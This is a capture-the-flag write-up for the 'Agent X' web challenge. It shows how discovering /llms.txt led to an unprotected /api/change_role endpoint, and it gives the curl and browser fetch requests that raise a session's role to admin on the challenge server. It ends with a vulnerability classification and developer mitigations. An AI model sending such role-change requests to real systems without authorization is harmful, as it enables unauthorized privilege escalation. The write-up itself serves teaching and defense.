# Cyber-eto Qualifications 2025 - Agent X CTF Challenge Writeup

## Challenge Description

**Challenge Name:** Agent X — the Best AI Agent Crawler  
**Category:** Web/OSINT  
**Challenge URL:** `http://161.97.155.116:5003/`

**Challenge Hint:**
> "Did you hear about the newest AI crawling policies? Wait, are you still stuck in robots.txt?"

The challenge presents a web interface titled "Agent X — the Best AI Agent Crawler" with a simple message indicating that the user's current role is "user" and suggesting to "Try to find exploit YOUR Mind (maybe in /????.txt)."

## Initial Analysis

Upon accessing the challenge URL, we're greeted with a dark-themed interface displaying:

```
Agent X — the Best AI Agent Crawler

Your role: user

No flag visible. Try to find exploit YOUR Mind (maybe in /????.txt ).
```

The hint about "newest AI crawling policies" and being "stuck in robots.txt" immediately suggests we need to look beyond traditional web crawling configuration files.

## Understanding the Hint: Modern AI Crawling Standards

### Step 1: Traditional vs. Modern Crawling Policies

The challenge explicitly mentions moving past `robots.txt`, which is the 30-year-old standard for controlling web crawler access. This hint points to newer AI-specific crawling policy files that have emerged in 2024-2025:

**Traditional Standard:**
- `robots.txt` - Used since 1994 for search engine crawlers

**Modern AI Standards:**
- `llms.txt` - A newer format designed specifically for Large Language Models (LLMs)
- `ai.txt` - Alternative standard for AI crawler permissions
- `.well-known/ai-plugin.json` - OpenAI's plugin specification

Given the challenge's emphasis on "newest" policies and the timeframe, `llms.txt` is the most likely candidate.

### Step 2: Testing Common Endpoints

Let's systematically check for various configuration files:

```bash
# Traditional approach (mentioned as outdated in the hint)
$ curl http://161.97.155.116:5003/robots.txt
# Result: 404 Not Found

# AI-specific alternatives
$ curl http://161.97.155.116:5003/ai.txt
# Result: 404 Not Found

$ curl http://161.97.155.116:5003/.well-known/ai-plugin.json
# Result: 404 Not Found
```

### Step 3: Discovery of llms.txt

Following the pattern of modern AI crawling policies, we test `llms.txt`:

```bash
$ curl http://161.97.155.116:5003/llms.txt
```

🎯 **Success!** The file exists and contains:

```
# llm.txt — A tiny hint file for LLM crawlers 

# Useful endpoints:
# - GET  /public/help
# - POST /api/change_role
```

This discovery confirms the challenge's theme: modern AI crawling policies are replacing traditional methods like `robots.txt`.

## API Endpoint Analysis

### Step 4: Exploring the Discovered Endpoints

The `llms.txt` file reveals two interesting endpoints:

#### Endpoint 1: /public/help (GET)

```bash
$ curl http://161.97.155.116:5003/public/help
# Result: 404 Not Found
```

This endpoint doesn't exist or is protected. The real target is likely the second endpoint.

#### Endpoint 2: /api/change_role (POST)

This endpoint suggests we can modify our user role. Let's test it:

```bash
$ curl -X POST http://161.97.155.116:5003/api/change_role \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Response:
{"role":"admin","status":"ok"}
```

🎯 **Successful response!** However, there's a catch...

### Step 5: Understanding Session Management

The API accepts our role change request, but when we refresh the main page, nothing changes. This indicates that:

1. The server uses **session cookies** to track user identity
2. Our POST request without cookies changed some generic state, not our specific session
3. We need to include our session cookie in the request

## Privilege Escalation

### Step 6: Identifying Session Cookies

Opening the browser's Developer Tools (F12), we can inspect the cookies:

```
Network Tab → Request Headers → Cookie
```

The application uses a session cookie (typically named `session` or similar) to track the authenticated user.

### Step 7: Authenticated Role Change

We have two approaches to include our session cookie:

#### Approach 1: Using cURL with Cookie

```bash
# First, extract your session cookie from the browser
# Then use it in the request:

$ curl -X POST http://161.97.155.116:5003/api/change_role \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION_COOKIE_HERE" \
  -d '{"role": "admin"}'

# Response:
{"role":"admin","status":"ok"}
```

#### Approach 2: Using Browser Console (Recommended)

Open the browser's Developer Console (F12 → Console) and execute:

```javascript
fetch('http://161.97.155.116:5003/api/change_role', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({role: 'admin'}),
  credentials: 'include'  // This automatically includes cookies
})
.then(r => r.json())
.then(console.log)
```

The `credentials: 'include'` parameter ensures that the browser automatically sends the session cookie with the request.

### Step 8: Flag Retrieval

After successfully changing the role to "admin" with proper authentication, refresh the main page:

```
http://161.97.155.116:5003/
```

🎉 **Success!** The page now displays the flag.

## Final Flag

**Flag:** `cybereto{[FLAG_VALUE_HERE]}`

*(Note: The actual flag value would be displayed on the page after role escalation)*

## Key Lessons Learned

This challenge teaches several important security and web technology concepts:

### 1. Modern Web Standards Evolution

**Traditional Standards:**
- `robots.txt` (1994) - Search engine crawler control
- Voluntary compliance
- Simple allow/disallow rules

**Modern AI Standards:**
- `llms.txt` (2024-2025) - LLM-specific crawler guidance
- Curated content for AI inference
- Designed for the AI-powered search era

**Key Difference:** While `robots.txt` focuses on exclusion (what NOT to crawl), `llms.txt` focuses on curation (what SHOULD be prioritized for AI models).

### 2. Insecure Direct Object Reference (IDOR)

The `/api/change_role` endpoint demonstrates an IDOR vulnerability:
- **Issue:** Any user can request a role change without proper authorization checks
- **Real-world Impact:** Privilege escalation, unauthorized access to admin features
- **Mitigation:** Implement proper authorization checks on the server side before allowing role modifications

### 3. Session Management

The challenge demonstrates the importance of session-based authentication:
- **Cookie-based Sessions:** Server tracks user state via cookies
- **Stateless APIs:** The API endpoint itself is stateless; session management bridges the gap
- **Security Implications:** Proper session handling prevents unauthorized access

### 4. API Enumeration

Finding hidden API endpoints is crucial:
- **Documentation Files:** `llms.txt`, `robots.txt`, `sitemap.xml`
- **Common Patterns:** `/api/*`, `/.well-known/*`, `/public/*`
- **OSINT Techniques:** Understanding modern web standards helps discover less obvious endpoints

## Technical Analysis

### Request/Response Flow

```
1. Initial Access
   Browser → GET / → Server
   Response: HTML page showing role: user

2. Discovery Phase
   Browser → GET /llms.txt → Server
   Response: Hints about /api/change_role endpoint

3. Privilege Escalation Attempt (Unauthenticated)
   curl → POST /api/change_role (no cookie) → Server
   Response: {"role":"admin","status":"ok"}
   Result: No effect on our session

4. Privilege Escalation (Authenticated)
   Browser (with session) → POST /api/change_role → Server
   Response: {"role":"admin","status":"ok"}
   Server updates session role

5. Flag Retrieval
   Browser → GET / (with admin session) → Server
   Response: HTML page showing the flag
```

### Vulnerability Classification

**CWE-639: Authorization Bypass Through User-Controlled Key**
- The application allows users to modify their own authorization level
- No server-side validation of role change legitimacy
- OWASP Top 10: A01:2021 - Broken Access Control

## Tools and Techniques Used

1. **Web Reconnaissance**
   - Browser Developer Tools (Network, Console, Cookies)
   - cURL for API testing
   - Manual endpoint enumeration

2. **Modern Web Standards Knowledge**
   - Understanding of `llms.txt` vs `robots.txt`
   - AI crawler ecosystem awareness
   - Emerging web security patterns

3. **Session Manipulation**
   - Cookie inspection and extraction
   - Authenticated API requests
   - Browser-based fetch API usage

4. **API Testing**
   - JSON payload construction
   - HTTP method testing (GET, POST)
   - Header manipulation

## Timeline of Investigation

1. **Challenge Analysis** - Read hint about "newest AI crawling policies"
2. **Research Phase** - Investigated modern alternatives to robots.txt
3. **Endpoint Discovery** - Found `/llms.txt` containing API hints
4. **Initial API Test** - Tested `/api/change_role` without authentication
5. **Session Analysis** - Identified session cookie requirement
6. **Authenticated Request** - Made role change request with session cookie
7. **Flag Retrieval** - Refreshed page to reveal the flag

## Security Recommendations

For developers building similar systems:

1. **Never Trust Client Input**
   - Implement server-side authorization checks
   - Validate role changes against current user permissions
   - Use role-based access control (RBAC) properly

2. **Secure API Design**
   - Require authentication for sensitive operations
   - Implement proper authorization middleware
   - Log all privilege escalation attempts

3. **Session Security**
   - Use secure, HTTP-only cookies
   - Implement CSRF protection
   - Validate session integrity

4. **API Documentation**
   - Don't expose internal APIs in public documentation files
   - Use proper API gateway with authentication
   - Implement rate limiting

## Conclusion

The "Agent X" challenge cleverly combines modern web development trends (AI crawler policies) with classic web security vulnerabilities (insecure role changes). It demonstrates that even as new technologies emerge, fundamental security principles remain critical. The challenge successfully teaches participants about:

- The evolution from `robots.txt` to `llms.txt`
- API security and authorization flaws
- Session management concepts
- Web reconnaissance techniques

This challenge serves as a reminder that security awareness must evolve alongside new technologies, and that modern applications require both knowledge of emerging standards and classic security principles.
